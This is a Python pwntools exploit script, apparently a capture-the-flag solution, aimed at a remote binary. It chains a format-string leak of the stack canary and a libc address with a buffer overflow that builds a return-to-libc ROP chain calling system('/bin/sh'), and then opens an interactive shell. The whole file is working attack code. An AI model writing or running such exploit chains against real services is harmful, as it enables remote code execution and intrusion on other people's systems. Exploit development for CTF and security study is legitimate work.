from pwn import *
import sys
import os
#python3 unwinable.py remote
remote_ip,port = '13.126.29.6','8020'
binary = './vuln'

elf  = ELF(binary)
libc = ELF("libc")
rop  = ROP(elf)

if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)

else:
    io = process(binary)
    gdb.attach(io,brkpts)

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

vuln    = elf.symbols['vuln']
ret     = (rop.find_gadget(['ret']))[0] 
pop_rdi = (rop.find_gadget(['pop rdi','ret']))[0] 

if __name__== "__main__":

    #leak1
    sla(': ','%31$p')
    ru("Agent ")
    canary = int(rl().decode(),16)
    log.info("Canary  : {}".format(hex(canary)))

    #payload = ''
    payload = b'A'*(0xc0-8)
    payload += p64(canary)
    payload += b'B'*8
    payload += p64(ret)
    payload += p64(vuln)

    sla(">>",payload)

    #leak2
    sla(': ','%35$p')
    ru("Agent ")
    leak = int(rl().decode(),16)-243
    
    libc_start_main = libc.symbols['__libc_start_main']
    base = leak - libc_start_main
    system = base + libc.symbols['system']
    binsh  = base + next(libc.search(b"/bin/sh"))

    log.info("leak    : {}".format(hex(leak)))
    log.info("base    : {}".format(hex(base)))
    log.info("system  : {}".format(hex(system)))
    log.info("/bin/sh : {}".format(hex(binsh)))

    #payload = ''
    payload = b'A'*(0xc0-8)
    payload += p64(canary)
    payload += b'B'*8
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(system)
        

    sla(">>",payload)

    io.interactive()
